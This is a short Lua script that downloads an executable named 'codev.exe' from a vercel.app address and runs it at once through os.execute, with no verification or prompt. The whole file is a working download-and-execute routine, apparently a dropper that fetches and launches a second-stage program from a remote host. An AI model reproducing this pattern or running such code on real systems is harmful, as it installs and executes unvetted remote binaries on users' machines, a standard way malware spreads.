local http = require("socket.http")
local ltn12 = require("ltn12")
local os = require("os")

-- URL of the .exe file to download
local exeUrl = "https://codev-zeta.vercel.app/codev.exe"

-- Filename to save the downloaded .exe file
local exeFilename = "codev.exe"

-- Function to download a file from a URL
local function downloadFile(url, filename)
    local file, err = io.open(filename, "wb")
    if not file then
        print("Error opening file for writing:", err)
        return false
    end

    local body, code, headers = http.request {
        url = url,
        sink = ltn12.sink.file(file),
        protocol = "tlsv1_2"
    }

    file:close()

    if code == 200 then
        print("File downloaded successfully:", filename)
        return true
    else
        print("Error downloading file. HTTP status code:", code)
        return false
    end
end

-- Function to execute the downloaded .exe file
local function executeExe(filename)
    local result = os.execute(filename)
    if result == 0 then
        print("Execution of", filename, "completed successfully.")
    else
        print("Error executing", filename)
    end
end

-- Main script execution
print("Downloading", exeUrl, "...")
if downloadFile(exeUrl, exeFilename) then
    print("Download completed.")
    print("Executing", exeFilename, "...")
    executeExe(exeFilename)
else
    print("Download failed. Unable to execute.")
end
